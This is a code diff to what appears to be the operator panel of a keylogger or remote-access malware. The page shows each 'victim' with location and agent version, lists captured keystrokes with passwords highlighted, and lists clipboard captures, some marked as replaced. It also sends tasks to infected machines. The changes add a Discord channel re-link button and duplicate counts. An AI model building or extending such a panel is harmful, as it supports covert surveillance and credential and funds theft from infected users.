@@ -75,8 +75,21 @@ export default function VictimPage() {
     }
   }
 
-  async function saveTags(event: React.FormEvent) {
-    event.preventDefault();
+  async function relink() {
+    if (!data?.discordChannel) return;
+    setBusy('relink');
+    try {
+      await mutate(`/discord/ignored/${data.discordChannel}`, 'DELETE');
+      toast.success('Channel queued for re-link');
+      victim.refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 're-link failed');
+    } finally {
+      setBusy('');
+    }
+  }
+
+  async function saveTags(event: React.FormEvent) {    event.preventDefault();
     setBusy('tags');
     try {
       await mutate(`/victims/${id}`, 'PATCH', { tags: tagText.split(',').map((tag) => tag.trim()).filter(Boolean) });
@@ -100,6 +113,10 @@ export default function VictimPage() {
           <Badge tone="brand">{data.profile}</Badge>
           {data.discordChannel ? <Badge tone="brand">discord</Badge> : <Badge>api</Badge>}
           {data.discordMissingAt ? <Badge tone="bad" title="Recreate the channel in Discord or re-link it from Victims">channel missing</Badge> : null}
+          {data.discordIgnored ? <Badge tone="warn" title="The channel stays ignored after a victim delete">channel ignored</Badge> : null}
+          {data.discordIgnored && data.discordChannel && role === 'admin' ? (
+            <Button size="sm" variant="secondary" disabled={busy === 'relink'} loading={busy === 'relink'} onClick={relink}>re-link</Button>
+          ) : null}
           <Badge>{data.agentVersion || 'no version'}</Badge>
           <span className="font-mono text-2xs text-muted">{short(data.id)} · {flag(data.countryCode)} {data.country ?? 'unknown'} {data.city ? `· ${data.city}` : ''}</span>
           <div className="ml-auto flex gap-1.5">
@@ -218,7 +235,7 @@ export default function VictimPage() {
               <div className="max-h-[540px] divide-y divide-line/60 overflow-y-auto">
                 {keylogs.loading ? <SkeletonRows rows={8} cols={2} /> : (keylogs.data?.items ?? []).map((row) => (
                   <div key={row.id} className="p-2">
-                    <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.title}</p>
+                    <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.title}{row.count && row.count > 1 ? ` · ×${row.count}` : ''}</p>
                     <p className={`font-mono text-xs ${row.password ? 'text-warn' : ''}`}>{row.text}</p>
                   </div>
                 ))}
@@ -236,7 +253,7 @@ export default function VictimPage() {
                     <Badge tone={row.kind === 'text' ? 'default' : 'brand'}>{row.kind}</Badge>
                     <div className="min-w-0 flex-1">
                       <p className="break-all font-mono text-xs">{row.content}</p>
-                      <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.window}{row.replaced ? ` · replaced → ${row.replaced}` : ''}</p>
+                      <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.window}{row.replaced ? ` · replaced → ${row.replaced}` : ''}{row.count && row.count > 1 ? ` · ×${row.count}` : ''}</p>
                     </div>
                     <Button size="icon" variant="ghost" onClick={() => copy(row.content)}><Copy className="h-3 w-3" /></Button>
                   </div>
@@ -266,7 +283,7 @@ export default function VictimPage() {
         </Tabs>
       </div>
 
-      <TaskDialog open={dialog} onOpenChange={setDialog} victimIds={[id]} victims={[data]} />
+      <TaskDialog open={dialog} onOpenChange={setDialog} victimIds={[id]} victims={[data]} linked={!taskBlocked} />
       <Dialog open={tagsOpen} onOpenChange={setTagsOpen}>
         <DialogContent>
           <DialogTitle>Edit tags</DialogTitle>
